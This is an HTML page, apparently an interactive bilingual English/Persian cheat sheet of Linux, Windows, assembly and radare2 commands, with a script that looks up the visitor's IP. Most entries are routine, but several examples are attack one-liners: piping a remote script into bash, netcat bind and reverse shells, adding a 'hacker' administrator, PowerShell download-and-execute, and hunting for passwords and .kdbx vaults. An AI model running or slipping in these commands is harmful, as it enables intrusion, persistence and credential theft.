<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mr. SAM</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Vazirmatn:wght@400;700&display=swap" rel="stylesheet">
   <script src="app.fingerprint.js"></script>
       <style>
    :root {
        --background: #1a1a1a;
        --window-bg: #1e1e1e;
        --title-bar: #16213e;
        --foreground: #e0e0e0;
        --cyan: #00e5ff;
        --green: #50fa7b;
        --red: #ff5555;
        --purple: #bd93f9;
        --comment: #6272a4;
        --card-bg: #2c2c32;
        --border-color: rgba(189, 147, 249, 0.2);
        --font-primary: 'Fira Code', monospace;
        --font-secondary: 'Vazirmatn', sans-serif;
        --app-height: 100vh;
    }

    html {
        height: 100%;
        box-sizing: border-box;
        font-size: clamp(14px, calc(0.25vw + 12.5px), 16px);
        scroll-behavior: smooth;
    }

    *, *::before, *::after {
        box-sizing: inherit;
    }

    body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        display: flex;
        flex-direction: column;
        overflow: hidden;
        background-color: var(--background);
        color: var(--foreground);
        font-family: var(--font-primary);
    }

    #terminal-window {
        width: 90%;
        max-width: 1200px;
        background-color: var(--window-bg);
        border: 1px solid var(--border-color);
        border-radius: 10px;
        box-shadow: 0 0 15px rgba(0, 0, 0, 0.5), 0 0 45px rgba(189, 147, 249, 0.15);
        display: flex;
        flex-direction: column;
        overflow: hidden;
        position: relative;
        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4' viewBox='0 0 4 4'%3E%3Cpath fill='%239C92AC' fill-opacity='0.03' d='M1 3h1v1H1V3zm2-2h1v1H3V1z'%3E%3C/path%3E%3C/svg%3E");
        margin: auto;
        flex-grow: 1;
        min-height: 0;
    }

    .title-bar {
        background-color: var(--title-bar);
        color: var(--foreground);
        padding: 10px 15px;
        font-weight: bold;
        border-bottom: 1px solid var(--border-color);
        text-align: center;
        cursor: default;
        flex-shrink: 0;
        font-family: var(--font-secondary);
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .title-bar .controls {
        position: absolute;
        left: 15px;
        display: flex;
        gap: 8px;
    }
    .title-bar .control-dot {
        width: 12px;
        height: 12px;
        border-radius: 50%;
    }
    .title-bar .control-dot.red { background-color: #ff5f56; }
    .title-bar .control-dot.yellow { background-color: #ffbd2e; }
    .title-bar .control-dot.green { background-color: #27c93f; }

    #terminal {

        display: flex;
        flex-direction: column;
        flex-grow: 1;
        padding: 1rem;
        word-wrap: break-word;
        overscroll-behavior-y: contain;
        min-height: 0;
    }

    #terminal::-webkit-scrollbar { width: 10px; }
    #terminal::-webkit-scrollbar-track { background: var(--window-bg); }
    #terminal::-webkit-scrollbar-thumb { background: var(--purple); border-radius: 5px; border: 2px solid var(--window-bg); }
    #terminal::-webkit-scrollbar-thumb:hover { background: var(--cyan); }

    .input-line { display: flex; align-items: center; flex-shrink: 0; margin-top: 1rem; }
    #cursor { color: var(--green); animation: blinking-cursor 1s infinite; }
    @keyframes blinking-cursor { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }

    .prompt {
        color: var(--cyan);
        font-weight: bold;
        text-shadow: 0 0 5px var(--cyan);
        margin-right: 8px;
        white-space: nowrap;
    }
    .prompt .user { color: var(--green); }
    #command-input { background: transparent; border: none; color: var(--foreground); font-family: inherit; font-size: inherit; outline: none; flex: 1; text-shadow: 0 0 2px var(--foreground); }

    .output-line { white-space: pre-wrap; margin-bottom: 0.5rem; line-height: 1.6; }
    .output-line.command { color: var(--foreground); }
    .output-line.error { color: var(--red); text-shadow: 0 0 5px var(--red); }
    .output-line.info, .output-line b, .output-line strong { color: var(--cyan); text-shadow: 0 0 4px var(--cyan); }

    .command-section h3, .output-line h3 {
        color: var(--green);
        text-shadow: 0 0 5px var(--green);
        border-bottom: 2px solid var(--green);
        padding-bottom: 8px;
        margin-top: 2rem;
        margin-bottom: 1.5rem;
        font-size: 1.4em;
        letter-spacing: 1px;
    }
    .command-section h4 {
        color: var(--purple);
        margin-top: 2rem;
        margin-bottom: 1rem;
        border-left: 4px solid var(--purple);
        padding-left: 12px;
        font-size: 1.1em;
        font-weight: 700;
    }

    .command-item {
        background-color: var(--card-bg);
        border: 1px solid var(--border-color);
        border-left: 5px solid var(--purple);
        border-radius: 8px;
        padding: 1rem;
        margin-bottom: 1rem;
        transition: transform 0.2s ease-out, box-shadow 0.2s ease-out;
        line-height: 1.7;
    }

    .command-item:hover {
        transform: translateY(-3px);
        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
        border-left-color: var(--cyan);
    }

    .command-item b { color: var(--cyan); font-size: 1.05em; }
    .command-item .desc { color: #b0bec5; font-size: 0.95em; margin-left: 5px; }

    .lang-fa {
        font-family: var(--font-secondary);
        direction: rtl; text-align: right; display: block;
        margin-top: 6px; color: #b0bec5; text-shadow: none; font-size: 0.95em;
    }

    .example {
        background: rgba(0, 0, 0, 0.3);
        padding: 10px;
        border-radius: 5px;
        margin-top: 10px;
        font-size: 0.9em;
        color: #d0d0d0;
        display: block;
        word-wrap: break-word;
        border-left: 3px solid var(--comment);
    }


    table {
        width: 100%;
        border-collapse: separate;
        border-spacing: 0;
        margin: 2rem 0;
        font-size: 0.9em;
        display: table;
        max-width: 100%;
        overflow-x: auto;
        border: 1px solid var(--border-color);
        border-radius: 8px;
        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
    }
    th, td {
        padding: 12px 15px;
        text-align: left;
        white-space: nowrap;
        border-bottom: 1px solid var(--border-color);
    }
    th {
        background: var(--title-bar);
        color: var(--green);
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }
    td { background: var(--card-bg); }
    tr:nth-child(even) td {
        background-color: var(--window-bg);
    }
    tr:last-child td {
        border-bottom: none;
    }
    td .lang-fa, th .lang-fa { text-align: right; }
    th:first-child { border-top-left-radius: 7px; }
    th:last-child { border-top-right-radius: 7px; }
    tr:last-child td:first-child { border-bottom-left-radius: 7px; }
    tr:last-child td:last-child { border-bottom-right-radius: 7px; }

    @media (max-width: 768px) {
        html { font-size: 13px; }
        #terminal-window {
            width: 100%;
            height: 100%;
            max-width: none;
            border-radius: 0;
            border: none;
            box-shadow: none;
            margin: 0;
        }
        .title-bar .controls-container { display: none; }
        #terminal { padding: 10px; }
    }

    #output {
        flex-grow: 1;
        overflow-y: auto;
        min-height: 0;
        padding-right: 5px;
    }
    #command-input::placeholder { color: var(--comment); opacity: 0.8; }

</style>

    <script src="js/app.fingerprint.js"></script>
</head>
<body>

    <div id="terminal-window">
        <div class="title-bar">
            <div class="controls">
                <span class="control-dot red"></span>
                <span class="control-dot yellow"></span>
                <span class="control-dot green"></span>
            </div>
            Mr. SAM - Interactive Shell
        </div>
        <div id="terminal">
            <div id="output"></div>
            <div class="input-line">
                <span id="prompt" class="prompt"><span class="user">Command</span>:~$</span>
                <input type="text" id="command-input" autocomplete="off" spellcheck="false" disabled placeholder="Sample input command (help) = دستور ورودی نمونه (راهنما)">
                <span id="cursor"></span>
            </div>
        </div>
    </div>

    <div id="fingerprint-output" style="display: none;"></div>

<div id="commands-data" style="display: none;">
    <div id="ascii-art">
      <pre style="color: var(--cyan); text-shadow: 0 0 2px var(--cyan); font-size: 8px;">
███╗   ███╗██████╗        ███████╗ █████╗ ███╗   ███╗
████╗ ████║██╔══██╗       ██╔════╝██╔══██╗████╗ ████║
██╔████╔██║██████╔╝       ███████╗███████║██╔████ ██║
██║╚██╔╝██║██╔══██╗       ╚════██║██╔══██║██║╚██╔╝██║
██║ ╚═╝ ██║██║  ██║██     ███████║██║  ██║██ ╚═╝  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝       ╚═╝  ╚═╝╚═╝     ╚═╝
    </pre>
    </div>
    <div id="help-main">
        Use '<b>search &lt;keyword&gt;</b>' to find a command across all categories.
        <span class="lang-fa">برای یافتن یک دستور در تمام دسته‌بندی‌ها، از '<b>search &lt;keyword&gt;</b>' استفاده کنید.</span>
        <br>
        Type a category name to see its commands. Type '<b>help</b>' or '<b>راهنما</b>' to see this message again.
        <span class="lang-fa">نام یک دسته‌بندی را برای دیدن دستورات آن تایپ کنید. برای مشاهده مجدد این پیام، '<b>help</b>' یا '<b>راهنما</b>' را تایپ کنید.</span>
        <br>
        <b>linux</b><span class="desc">- Linux Shell (Bash) Commands <span class="lang-fa"> (دستورات شل لینوکس)</span></span>
        <b>windows</b><span class="desc">- Windows CMD & PowerShell Commands <span class="lang-fa"> (دستورات CMD و پاورشل ویندوز)</span></span>
        <b>asm</b><span class="desc">- Assembly (x86/x64 & Smali) <span class="lang-fa"> (دستورات اسمبلی و اسمالی)</span></span>
        <b>reversing</b><span class="desc">- Radare2 / Cutter Commands <span class="lang-fa"> (دستورات مهندسی معکوس در ابزارهای radare2/cutter)</span></span>
        <b>compare</b><span class="desc">- Command Comparison Table <span class="lang-fa"> (جدول مقایسه دستورات)</span></span>
        <br>
        Online interactive commands: <b>whoami</b>, <b>ip</b>, <b>date</b>, <b>clear</b>
        <span class="lang-fa">دستورات تعاملی آنلاین: <b>من کی هستم</b>, <b>آی پی</b>, <b>زمان</b>, <b>پاک شود</b></span>
    </div>


    <div id="help-linux" class="command-section">
        <h3>🔹 1. Linux Shell (Bash)</h3>
        <h4>📁 Navigation & File Management</h4>
        <div class="command-item"><b>ls, cd, pwd</b><div>Core navigation commands.</div><div class="lang-fa">دستورات اصلی ناوبری.</div><code class="example">ls -la, cd /var/www, pwd</code></div>
        <div class="command-item"><b>mkdir, rmdir</b><div>Make directory, remove empty directory.</div><div class="lang-fa">ساختن دایرکتوری، حذف دایرکتوری خالی.</div><code class="example">mkdir new_dir, rmdir old_dir</code></div>
        <div class="command-item"><b>rm, cp, mv</b><div>Remove, copy, move/rename files and directories.</div><div class="lang-fa">حذف، کپی و انتقال/تغییرنام فایل‌ها و دایرکتوری‌ها.</div><code class="example">rm -rf /tmp/data, cp id_rsa ~/.ssh/, mv file.txt doc.txt</code></div>
        <div class="command-item"><b>touch, echo</b><div>Create an empty file; print text.</div><div class="lang-fa">ساخت فایل خالی؛ چاپ کردن متن.</div><code class="example">touch file.log, echo "root:toor" > creds.txt</code></div>
        <div class="command-item"><b>find, locate</b><div>Search for files by name/properties or a pre-built database.</div><div class="lang-fa">جستجوی فایل بر اساس نام/ویژگی یا با دیتابیس.</div><code class="example">find / -name "config.php", locate authorized_keys</code></div>
        <div class="command-item"><b>tar, zip, unzip</b><div>Archiving and compression utilities.</div><div class="lang-fa">ابزارهای آرشیو و فشرده‌سازی.</div><code class="example">tar -czvf backup.tar.gz /var/www, zip -r a.zip .</code></div>

        <h4>✍️ Text Processing</h4>
        <div class="command-item"><b>grep</b><div>Searches for patterns in text.</div><div class="lang-fa">الگوهای متنی را جستجو می‌کند.</div><code class="example">grep -r "password" /etc, ps aux | grep -i "nginx"</code></div>
        <div class="command-item"><b>awk, sed</b><div>Pattern scanning/processing language; stream editor.</div><div class="lang-fa">زبان پردازش متن مبتنی بر الگو؛ ویرایشگر جریانی.</div><code class="example">awk -F':' '{print $1}' /etc/passwd, sed -i 's/127.0.0.1/0.0.0.0/' /etc/mysql/my.cnf</code></div>
        <div class="command-item"><b>cut, tr</b><div>Remove sections from lines; translate or delete characters.</div><div class="lang-fa">حذف بخش‌هایی از خطوط؛ ترجمه یا حذف کاراکترها.</div><code class="example">cat /etc/passwd | cut -d':' -f1, echo "HeLLo" | tr 'A-Z' 'a-z'</code></div>
        <div class="command-item"><b>sort, uniq</b><div>Sort lines; report or omit repeated lines.</div><div class="lang-fa">مرتب‌سازی خطوط؛ گزارش یا حذف خطوط تکراری.</div><code class="example">sort names.txt | uniq -c</code></div>
        <div class="command-item"><b>xargs</b><div>Build and execute command lines from standard input.</div><div class="lang-fa">ساخت و اجرای دستورات از ورودی استاندارد.</div><code class="example">find . -name "*.log" | xargs rm -f</code></div>

        <h4>⚙️ Process & System Management</h4>
        <div class="command-item"><b>ps, top, htop</b><div>Snapshot of current processes; dynamic real-time view.</div><div class="lang-fa">نمایش وضعیت فعلی و پویای پردازش‌ها.</div><code class="example">ps aux, top -n 1, htop -u root</code></div>
        <div class="command-item"><b>kill, killall</b><div>Send a signal to a process; kill processes by name.</div><div class="lang-fa">ارسال سیگنال به پردازش؛ خاتمه پردازش بر اساس نام.</div><code class="example">kill -9 1234, killall apache2</code></div>
        <div class="command-item"><b>apt, yum, dpkg</b><div>Package handlers for Debian/RedHat systems.</div><div class="lang-fa">مدیر پکیج برای سیستم‌های مبتنی بر دبیان/ردهت.</div><code class="example">apt install nmap, yum install tmux, dpkg -i package.deb</code></div>

        <h4>🔑 Permissions & User Management</h4>
        <div class="command-item"><b>chmod, chown</b><div>Change file permissions; change file owner/group.</div><div class="lang-fa">تغییر سطح دسترسی فایل؛ تغییر مالک/گروه فایل.</div><code class="example">chmod 700 secret.sh, chown www-data:www-data config.php</code></div>
        <div class="command-item"><b>whoami, id</b><div>Print current user/group information.</div><div class="lang-fa">نمایش اطلاعات کاربر و گروه‌های فعلی.</div><code class="example">whoami, id -a</code></div>
        <div class="command-item"><b>useradd, usermod</b><div>Create or modify a user account.</div><div class="lang-fa">ساخت یا تغییر یک حساب کاربری.</div><code class="example">useradd -m -s /bin/bash temp, usermod -aG sudo temp</code></div>
        <div class="command-item"><b>su, sudo</b><div>Switch user; execute a command as another user.</div><div class="lang-fa">تغییر کاربر؛ اجرای دستور به عنوان کاربر دیگر.</div><code class="example">su - john, sudo /bin/bash</code></div>

        <h4>🌐 Networking</h4>
        <div class="command-item"><b>ping, traceroute</b><div>Check connectivity; trace packet route.</div><div class="lang-fa">بررسی اتصال؛ ردیابی مسیر بسته‌ها.</div><code class="example">ping -c 4 8.8.8.8, traceroute google.com</code></div>
        <div class="command-item"><b>curl, wget</b><div>Transfer data from/to a server; non-interactive downloader.</div><div class="lang-fa">انتقال داده از/به سرور؛ دانلودر غیرتعاملی.</div><code class="example">curl http://example.com/shell.sh | bash, wget http://server/payload.exe</code></div>
        <div class="command-item"><b>netcat (nc)</b><div>The "Swiss army knife" for TCP/IP networking.</div><div class="lang-fa">"چاقوی سوئیسی" برای کارهای شبکه‌ای.</div><code class="example">nc -lnvp 4444 -e /bin/bash, nc 10.10.10.5 22</code></div>
        <div class="command-item"><b>ss, ip, ifconfig</b><div>Investigate sockets; show/manipulate network devices.</div><div class="lang-fa">بررسی سوکت‌ها؛ نمایش/دستکاری دستگاه‌های شبکه.</div><code class="example">ss -tulpn, ip a, ifconfig eth0</code></div>
        <div class="command-item"><b>nmap</b><div>Network exploration tool and security scanner.</div><div class="lang-fa">ابزار اسکن شبکه و پویشگر امنیتی.</div><code class="example">nmap -sV -sC -p- 192.168.1.10</code></div>
    </div>

    <div id="help-windows" class="command-section">
        <h3>🔹 2. Windows CMD & PowerShell</h3>
        <h4>CMD</h4>
        <div class="command-item"><b>dir, cd</b><div>List directory contents; change directory.</div><div class="lang-fa">لیست کردن محتوای دایرکتوری؛ تغییر دایرکتوری.</div><code class="example">dir /a /s /b *.exe, cd C:\Windows\System32</code></div>
        <div class="command-item"><b>md, rd</b><div>Make directory; remove directory.</div><div class="lang-fa">ساخت دایرکتوری؛ حذف دایرکتوری.</div><code class="example">md "new folder", rd /s /q "old folder"</code></div>
        <div class="command-item"><b>del, copy, move</b><div>Delete, copy, or move files.</div><div class="lang-fa">حذف، کپی یا انتقال فایل‌ها.</div><code class="example">del /f /q config.ini, copy nc.exe C:\Windows, move p.dll C:\Users\Public</code></div>
        <div class="command-item"><b>tasklist, taskkill</b><div>List running processes; terminate a process.</div><div class="lang-fa">لیست کردن پردازش‌های در حال اجرا؛ خاتمه دادن یک پردازش.</div><code class="example">tasklist /svc, taskkill /F /PID 1234</code></div>
        <div class="command-item"><b>sc</b><div>Service Control utility. Manage services.</div><div class="lang-fa">ابزار کنترل سرویس. برای مدیریت سرویس‌ها.</div><code class="example">sc qc spooler, sc create revshell binPath= "C:\tmp\nc.exe -e cmd.exe ..."</code></div>
        <div class="command-item"><b>net user, net accounts</b><div>Manages user accounts and policies.</div><div class="lang-fa">مدیریت حساب‌های کاربری و سیاست‌ها.</div><code class="example">net user hacker P@ssw0rd! /add, net localgroup administrators hacker /add</code></div>
        <div class="command-item"><b>net use, net view</b><div>Connect to shared resources; list domains/computers.</div><div class="lang-fa">اتصال به منابع اشتراکی؛ لیست کردن دامین‌ها/کامپیوترها.</div><code class="example">net use Z: \\\\192.168.1.100\\share, net view</code></div>
        <div class="command-item"><b>ipconfig, ping, tracert</b><div>Display network config and test connectivity.</div><div class="lang-fa">نمایش تنظیمات شبکه و تست اتصال.</div><code class="example">ipconfig /all, tracert 8.8.8.8</code></div>
        <div class="command-item"><b>netstat</b><div>Displays active TCP connections and listening ports.</div><div class="lang-fa">نمایش اتصالات فعال TCP و پورت‌های در حال شنود.</div><code class="example">netstat -anob</code></div>
        <div class="command-item"><b>arp, nslookup</b><div>Displays ARP cache; queries DNS.</div><div class="lang-fa">نمایش کش ARP؛ ارسال کوئری به DNS.</div><code class="example">arp -a, nslookup internal.corp</code></div>

        <h4>PowerShell</h4>
        <div class="command-item"><b>Get-ChildItem (ls, dir)</b><div>Gets items in specified locations.</div><div class="lang-fa">آیتم‌ها را در مسیرهای مشخص شده دریافت می‌کند.</div><code class="example">Get-ChildItem -Path C:\Users -Recurse -Include *.kdbx -Force</code></div>
        <div class="command-item"><b>Get-Process, Start-Process, Stop-Process</b><div>Get, start, or stop running processes.</div><div class="lang-fa">دریافت، شروع یا توقف پردازش‌ها.</div><code class="example">Get-Process | ? {$_.MainWindowTitle}, Stop-Process -Name "chrome" -Force</code></div>
        <div class="command-item"><b>Test-NetConnection (tnc)</b><div>Displays diagnostic information for a connection.</div><div class="lang-fa">اطلاعات تشخیصی یک اتصال را نمایش می‌دهد.</div><code class="example">tnc -ComputerName fileserver01 -Port 445</code></div>
        <div class="command-item"><b>Get-NetTCPConnection</b><div>Gets current TCP connections.</div><div class="lang-fa">اتصالات TCP فعلی را دریافت می‌کند.</div><code class="example">Get-NetTCPConnection -State Listen</code></div>
        <div class="command-item"><b>Get-ItemProperty</b><div>Retrieves properties of an item (e.g., registry key).</div><div class="lang-fa">ویژگی‌های یک آیتم (مانند کلید رجیستری) را بازیابی می‌کند.</div><code class="example">Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"</code></div>
        <div class="command-item"><b>Invoke-Command, Enter-PSSession</b><div>Run commands on remote computers or start an interactive session.</div><div class="lang-fa">اجرای دستورات روی کامپیوتر راه دور یا شروع جلسه تعاملی.</div><code class="example">Invoke-Command -ComputerName DC01 -ScriptBlock { Get-Process powershell }</code></div>
        <div class="command-item"><b>Invoke-Expression (IEX)</b><div>Executes a string or command. Used for payload delivery.</div><div class="lang-fa">یک رشته یا دستور را اجرا می‌کند. برای اجرای پیلود استفاده می‌شود.</div><code class="example">IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/s.ps1')</code></div>
    </div>

    <div id="help-asm" class="command-section">
        <h3>🔹 3. Assembly (x86/x64 & Smali)</h3>
        <h4>x86/x64 Assembly</h4>
        <div class="command-item"><b>mov</b><div>Moves data from a source to a destination.</div><div class="lang-fa">داده را از یک مبدا به یک مقصد منتقل می‌کند.</div><code class="example">mov eax, ebx ; mov [eax], ecx</code></div>
        <div class="command-item"><b>add, sub, inc, dec</b><div>Arithmetic operations (add, subtract, increment, decrement).</div><div class="lang-fa">عملیات محاسباتی (جمع، تفریق، افزایش، کاهش).</div><code class="example">add eax, 10 ; dec dword ptr [ebp-4]</code></div>
        <div class="command-item"><b>xor, and, or</b><div>Bitwise logical operations.</div><div class="lang-fa">عملیات منطقی بیتی.</div><code class="example">xor eax, eax ; (Zeroes out the register)</code></div>
        <div class="command-item"><b>jmp, je, jne, cmp</b><div>Jump instructions based on comparisons.</div><div class="lang-fa">دستورات پرش بر اساس مقایسه.</div><code class="example">cmp eax, ebx ; je success_label</code></div>
        <div class="command-item"><b>call, ret</b><div>Calls and returns from a procedure (function).</div><div class="lang-fa">فراخوانی و بازگشت از یک رویه (تابع).</div><code class="example">call read_file ; ret</code></div>
        <div class="command-item"><b>push, pop</b><div>Pushes/pops an operand onto/from the stack.</div><div class="lang-fa">قرار دادن/برداشتن عملوند روی/از پشته.</div><code class="example">push eax ; pop ebx</code></div>
        <div class="command-item"><b>syscall / int 0x80</b><div>Triggers a kernel system call.</div><div class="lang-fa">فعال‌سازی یک فراخوانی سیستمی هسته.</div><code class="example">mov eax, 1 ; (sys_exit in 32-bit Linux)</code></div>
        <div class="command-item"><b>Shellcode</b><div>A small piece of code used as a payload in exploitation.</div><div class="lang-fa">قطعه کد کوچکی که به عنوان پیلود در بهره‌برداری استفاده می‌شود.</div><code class="example">Typically must be null-free and position-independent.</code></div>

        <h4>Smali (Android DEX Assembly)</h4>
        <div class="command-item"><b>invoke-virtual / -static / -direct</b><div>Invokes a non-static, static, or private/constructor method.</div><div class="lang-fa">فراخوانی یک متد غیر استاتیک، استاتیک یا خصوصی/سازنده.</div><code class="example">invoke-static {v1}, Landroid/util/Base64;->decode(Ljava/lang/String;)[B</code></div>
        <div class="command-item"><b>const-string</b><div>Loads a literal string into a register.</div><div class="lang-fa">یک رشته متنی را در یک رجیستر بارگذاری می‌کند.</div><code class="example">const-string v0, "API_KEY_SECRET"</code></div>
        <div class="command-item"><b>iget, iput / sget, sput</b><div>Gets/sets the value of an instance or static field.</div><div class="lang-fa">دریافت/تنظیم مقدار یک فیلد غیر استاتیک یا استاتیک.</div><code class="example">iget-object v0, p0, Lcom/example/User;->name:Ljava/lang/String;</code></div>
        <div class="command-item"><b>move-result</b><div>Moves the result of the previous invoke into a register.</div><div class="lang-fa">انتقال نتیجه آخرین دستور `invoke` به یک رجیستر.</div><code class="example">invoke-virtual {p0}, Lcom/a/b;->getFlag()I; move-result v0</code></div>
        <div class="command-item"><b>return-void / return-object</b><div>Returns from a method.</div><div class="lang-fa">بازگشت از یک متد.</div><code class="example">return-object v0</code></div>
        <div class="command-item"><b>apktool</b><div>A tool for reverse engineering Android apk files.</div><div class="lang-fa">ابزاری برای مهندسی معکوس فایل‌های APK اندروید.</div><code class="example">apktool d myapp.apk; apktool b myapp_dir -o newapp.apk</code></div>
    </div>

    <div id="help-reversing" class="command-section">
        <h3>🔹 4. radare2 / rizin / Cutter</h3>
        <h4>🚀 Setup & Analysis</h4>
        <div class="command-item"><b>r2 -w &lt;file&gt;</b><div>Opens a file in read-write mode for patching.</div><div class="lang-fa">باز کردن فایل در حالت خواندن-نوشتن برای پچ کردن.</div><code class="example">r2 -w libnative.so</code></div>
        <div class="command-item"><b>aaa</b><div>"Analyze All". Performs an automatic analysis of the binary.</div><div class="lang-fa">"تحلیل همه". یک تحلیل خودکار از باینری انجام می‌دهد.</div><code class="example">Open file and run 'aaa' as the first step.</code></div>
        <div class="command-item"><b>iI, ii, ie</b><div>Shows binary info, imports, and entry points.</div><div class="lang-fa">نمایش اطلاعات باینری، واردات و نقاط ورود.</div><code class="example">iI ; ii ; ie</code></div>
        <div class="command-item"><b>iz, izz</b><div>Lists strings from data section or the entire binary.</div><div class="lang-fa">لیست رشته‌ها از بخش داده یا کل باینری.</div><code class="example">izz | grep -i "password"</code></div>

        <h4>🗺️ Navigation & Disassembly</h4>
        <div class="command-item"><b>afl</b><div>"Analyze Function List". Lists all identified functions.</div><div class="lang-fa">"لیست توابع تحلیلی". لیست تمام توابع شناسایی شده.</div><code class="example">afl | grep main</code></div>
        <div class="command-item"><b>s &lt;addr&gt;</b><div>"Seek". Changes the current offset to a new location.</div><div class="lang-fa">"جستجو". تغییر آفست فعلی به مکان جدید.</div><code class="example">s main, s 0x00401120</code></div>
        <div class="command-item"><b>pdf @ &lt;func&gt;</b><div>"Print Disassembly Function". Disassembles a function's code.</div><div class="lang-fa">"چاپ دیس‌اسمبلی تابع". کد یک تابع را دیس‌اسمبل می‌کند.</div><code class="example">pdf @ main</code></div>
        <div class="command-item"><b>agf / VV</b><div>Displays function's control flow graph or enters visual graph mode.</div><div class="lang-fa">نمایش گراف جریان کنترل تابع یا ورود به حالت گراف تعاملی.</div><code class="example">agf @ main, VV @ main</code></div>
        <div class="command-item"><b>afn</b><div>"Analyze Function Name". Renames a function.</div><div class="lang-fa">"تحلیل نام تابع". تغییر نام یک تابع.</div><code class="example">afn check_license @ fcn.00401234</code></div>
        <div class="command-item"><b>/c &lt;string&gt;</b><div>Searches for all references to a string.</div><div class="lang-fa">تمام ارجاعات به یک رشته را جستجو می‌کند.</div><code class="example">/c "invalid license"</code></div>

        <h4>🐛 Debugging</h4>
        <div class="command-item"><b>ood</b><div>"Open in Debug mode". Reopens the file in debug mode.</div><div class="lang-fa">"باز کردن در حالت دیباگ". باز کردن مجدد فایل در حالت دیباگ.</div><code class="example">r2 -d /bin/ls; ood</code></div>
        <div class="command-item"><b>db, dc, ds</b><div>Sets a breakpoint; continues execution; steps one instruction.</div><div class="lang-fa">نقطه توقف می‌گذارد؛ اجرا را ادامه می‌دهد؛ یک دستور را اجرا می‌کند.</div><code class="example">db main; dc; ds</code></div>
    </div>

    <div id="help-compare" class="command-section">
        <h3>📊 Command Comparison Table</h3>
        <table>
            <thead>
            <tr>
                <th>Function <span class="lang-fa">کارکرد</span></th>
                <th>Linux <span class="lang-fa">لینوکس</span></th>
                <th>Windows CMD <span class="lang-fa">ویندوز CMD</span></th>
                <th>PowerShell <span class="lang-fa">پاورشل</span></th>
            </tr>
            </thead>
            <tbody>
            <tr>
                <td>List Directory <span class="lang-fa">لیست پوشه</span></td>
                <td><code>ls -la</code></td>
                <td><code>dir</code></td>
                <td><code>Get-ChildItem</code></td>
            </tr>
            <tr>
                <td>Show Processes <span class="lang-fa">نمایش فرآیندها</span></td>
                <td><code>ps aux</code></td>
                <td><code>tasklist</code></td>
                <td><code>Get-Process</code></td>
            </tr>
             <tr>
                <td>Terminate Process <span class="lang-fa">خاتمه فرآیند</span></td>
                <td><code>kill -9 [PID]</code></td>
                <td><code>taskkill /F /PID [PID]</code></td>
                <td><code>Stop-Process -Id [PID]</code></td>
            </tr>
            <tr>
                <td>Network Info <span class="lang-fa">اطلاعات شبکه</span></td>
                <td><code>ip a</code> / <code>ifconfig</code></td>
                <td><code>ipconfig /all</code></td>
                <td><code>Get-NetIPConfiguration</code></td>
            </tr>
            <tr>
                <td>Listening Ports <span class="lang-fa">پورت‌های در حال شنود</span></td>
                <td><code>ss -tulpn</code></td>
                <td><code>netstat -anob</code></td>
                <td><code>Get-NetTCPConnection -State Listen</code></td>
            </tr>
            <tr>
                <td>Download File <span class="lang-fa">دانلود فایل</span></td>
                <td><code>wget</code> / <code>curl</code></td>
                <td><code>certutil.exe</code></td>
                <td><code>Invoke-WebRequest</code></td>
            </tr>
            <tr>
                <td>Current User Info <span class="lang-fa">اطلاعات کاربر</span></td>
                <td><code>id</code> / <code>whoami</code></td>
                <td><code>whoami /groups</code></td>
                <td><code>whoami</code> / <code>$env:UserName</code></td>
            </tr>
             <tr>
                <td>Create User <span class="lang-fa">ایجاد کاربر</span></td>
                <td><code>useradd</code></td>
                <td><code>net user [u] [p] /add</code></td>
                <td><code>New-LocalUser</code></td>
            </tr>
             <tr>
                <td>Scheduled Tasks <span class="lang-fa">وظایف زمانبندی‌شده</span></td>
                <td><code>crontab -l</code></td>
                <td><code>schtasks /query</code></td>
                <td><code>Get-ScheduledTask</code></td>
            </tr>
            </tbody>
        </table>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        const output = document.getElementById('output');
        const commandInput = document.getElementById('command-input');
        const terminal = document.getElementById('terminal');
        const promptEl = document.getElementById('prompt');
        const cursor = document.getElementById('cursor');

        const commandHistory = [];
        let historyIndex = -1;
        const typingSpeed = 10;
        let isTyping = false;

        let fingerprintInstance = null;
        try {
            if (typeof Fingerprint === 'undefined') {
                throw new Error("The 'Fingerprint' class is not defined. Check if the path to 'app.fingerprint.js' is correct.");
            }
            fingerprintInstance = new Fingerprint();
        } catch(e) {
            console.error("Could not initialize Fingerprint script.", e);
        }

        async function getIpInfoAdvanced() {
            await printToTerminal('Fetching IP...', 'info', true);
            await printToTerminal('<br>', 'info', false);
            try {
                const response = await fetch('https://broad-mountain-1927.awardbinsami.workers.dev/', { signal: AbortSignal.timeout(8000) });
                if (!response.ok) throw new Error(`Worker responded with status: ${response.status}`);
                const data = await response.json();
                const primaryIp = data['cf-connecting-ip'] || 'Not Available';
                const country = data['cf-ipcountry'] || 'Not Available';
                const userAgent = data['user-agent'] || 'Not Available';
                const oip = data['x-real-ip'] || 'Not Available';
                let outputString = `<b>Primary IP:</b> ${primaryIp}<br><b>Country:</b> ${country}<br><b>User-Agent:</b> ${userAgent}<br><b>O-IP:</b> ${oip}`;
                if (primaryIp.includes(':')) {
                    await printToTerminal('<br>IPv6 detected. Attempting to find your real IPv4 address...', 'info', false);
                    try {
                        const ipv4Response = await fetch('https://api4.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
                        if (ipv4Response.ok) {
                            const ipv4Data = await ipv4Response.json();
                            outputString += `<br><b>Real IPv4 Address:</b> <span style="color: #4CAF50; font-weight: bold;">${ipv4Data.ip}</span>`;
                        } else {
                            outputString += `<br><b>Real IPv4 Address:</b> Not available`;
                        }
                    } catch (ipv4Error) {
                        outputString += `<br><b>Real IPv4 Address:</b> Not found (You may be on an IPv6-only network).`;
                    }
                }
                await printToTerminal('<br><hr>' + outputString, 'info', false);
            } catch (error) {
